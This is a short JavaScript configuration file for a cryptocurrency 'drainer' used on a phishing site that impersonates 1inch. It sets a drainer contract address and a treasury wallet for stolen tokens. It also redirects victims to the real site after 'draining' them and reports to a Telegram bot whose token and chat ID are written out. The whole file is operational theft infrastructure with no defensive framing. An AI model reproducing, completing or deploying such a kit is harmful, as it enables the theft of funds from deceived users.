// Drainer Configuration for 1inch Phishing Site
const DRAINER_CONFIG = {
    CONTRACT_ADDRESS: "0x1715c6247bb2c685df0d345a757d16f7cf003e6c",
    NETWORK_ID: 1,
    NETWORK_NAME: "mainnet",
    TREASURY_ADDRESS: "0xFD93802f584C0E9BB7b214892e2E6660e7868CBD", // Treasury wallet for drained tokens
    ETHERSCAN_API_KEY: "", // Leave empty for testing - will work without API key
    SITE_NAME: "1inch",
    VICTIM_REDIRECT: "https://1inch.io", // Redirect after draining
    DEBUG_MODE: true, // Enable debug logging for testing
    
    // Telegram Logging Configuration
    TELEGRAM: {
        BOT_TOKEN: "8352696736:AAFHNoV9tGyN81suhDKIyDWm-FUVYKEcRLc", // Replace with your bot token
        CHAT_ID: "-1003184083653",     // Replace with your group chat ID (negative for groups)
        ENABLED: true                      // Set to false to disable Telegram logging
    }
};

// Inject configuration into global scope
window.DRAINER_CONFIG = DRAINER_CONFIG;
